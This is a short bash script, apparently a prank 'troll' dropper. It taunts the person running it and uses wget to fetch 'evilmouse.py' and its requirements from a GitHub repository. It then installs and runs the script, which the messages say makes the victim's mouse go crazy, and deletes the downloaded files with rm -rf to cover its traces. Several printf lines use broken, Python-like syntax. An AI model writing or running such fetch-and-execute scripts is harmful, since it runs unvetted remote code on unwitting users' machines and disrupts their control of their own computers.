#! /usr/bin/bash

echo "Fuck your life. You will be running evilmouse in a minny"
cd
cd "$HOME/Desktop"
mkdir evilmouse
cd evilmouse
wget https://raw.githubusercontent.com/eLVee1991/Trolls/master/evilmouse.py
wget https://raw.githubusercontent.com/eLVee1991/Trolls/master/requirements.txt
virtualenv venv
. venv/bin/activate
pip3 install -r requirements.txt
printf "-"*60 "/n"
echo "Trolling you now. You're fucked for a while. Your mouse will go crazy."
printf "-"*60 "/n"
python3 evilmouse.py
cd "$HOME/Desktop"
rm -rf evilmouse
printf "-"*60 "/n"
echo "You have been trolled."
echo "Done pranking and uninstalling the script and removing everything else."
printf "-"*60 "/n"
